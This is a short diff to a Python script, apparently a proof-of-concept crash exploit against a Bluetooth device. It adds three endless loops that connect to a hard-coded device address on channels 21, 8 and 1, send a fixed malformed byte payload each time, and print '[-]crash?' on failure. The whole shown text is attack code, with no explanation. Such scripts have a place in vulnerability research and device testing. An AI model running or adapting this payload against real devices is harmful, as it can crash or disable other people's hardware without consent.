@@ -51,3 +51,29 @@ try:
 except:
     print("[-]crash?")
 
+try:
+    while True:
+        sock = closed_normal_ch("6c:d3:ee:1c:25:67", 21)
+        sock.send(b"\x03\xef\x05\xa1\x01\x70")
+        sock.close()
+except:
+    print("[-]crash?")
+
+try:
+    while True:
+        sock = closed_normal_ch("6c:d3:ee:1c:25:67", 8)
+        sock.send(b"\x03\xef\x05\xa1\x01\x70")
+        sock.close()
+except:
+    print("[-]crash?")
+
+try:
+    while True:
+        sock = closed_normal_ch("6c:d3:ee:1c:25:67", 1)
+        sock.send(b"\x03\xef\x05\xa1\x01\x70")
+        sock.close()
+except:
+    print("[-]crash?")
+
+
+
